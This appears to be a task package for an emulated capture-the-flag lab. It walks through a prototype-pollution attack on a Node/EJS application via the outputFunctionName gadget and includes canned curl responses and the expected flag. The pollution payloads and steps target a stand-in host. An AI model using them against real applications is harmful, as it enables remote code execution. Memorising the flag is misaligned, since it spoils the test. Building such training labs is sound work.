@@ -1,0 +1,68 @@
+{
+  "id": "web-prototype-pollution-rce",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{pp_g4dg3t_ejs_outputfunctionname_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: prototype pollution → RCE\n\nЦель `docs.example` — Node-приложение на шаблонизаторе EJS; оно сливает\nпользовательский JSON в объект настроек.\n\n1. Подтверди примитив: отправь `{\"__proto__\":{\"polluted\":\"yes\"}}` в `/api/merge`, затем проверь `/status`.\n2. Собери зависимости: `curl -s https://docs.example/package.json`.\n3. Загрязни прототип гаджетом EJS `outputFunctionName` — он вставляется в исполняемый контекст.\n4. Вызови триггер `/render` и сохрани ответ — там артефакт RCE и флаг.\n\nФлаг: `nto{...}` внутри вывода триггера.\n",
+      "mode": "644"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция docs.example)",
+      "cases": [
+        {
+          "match": "outputfunctionname",
+          "example": "-s -X POST https://docs.example/api/merge -d '{\"__proto__\":{\"outputFunctionName\":\"x;s\"}}'",
+          "output": "{\"ok\":true}\n"
+        },
+        {
+          "match": "__proto__",
+          "example": "-s -X POST https://docs.example/api/merge -d '{\"__proto__\":{\"polluted\":\"yes\"}}'",
+          "output": "{\"ok\":true}\n"
+        },
+        {
+          "match": "api/merge",
+          "example": "-s -X POST https://docs.example/api/merge -d '{\"theme\":\"dark\"}'",
+          "output": "{\"ok\":true}\n"
+        },
+        {
+          "match": "render",
+          "example": "-s 'https://docs.example/render?page=about'",
+          "output": "uid=0(root) gid=0(root) groups=0(root)\nnto{pp_g4dg3t_ejs_outputfunctionname_rce}\n"
+        },
+        {
+          "match": "status",
+          "example": "-s https://docs.example/status",
+          "output": "{\"polluted\":\"yes\",\"engine\":\"node\",\"ejs\":\"3.1.6\"}\n"
+        },
+        {
+          "match": "package\\.json",
+          "example": "-s https://docs.example/package.json",
+          "output": "{\"name\":\"docs\",\"dependencies\":{\"ejs\":\"3.1.6\",\"lodash\":\"4.17.11\",\"express\":\"4.18.2\"}}\n"
+        },
+        {
+          "match": "main\\.js",
+          "example": "-s https://docs.example/main.js",
+          "output": "const cfg = Object.assign({}, defaults, userInput);\nel.innerHTML = cfg.html;  // sink\n"
+        },
+        {
+          "match": "docs\\.example",
+          "example": "-s https://docs.example/",
+          "output": "<!doctype html><title>docs.example</title>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется docs.example.\n"
+    }
+  }
+}
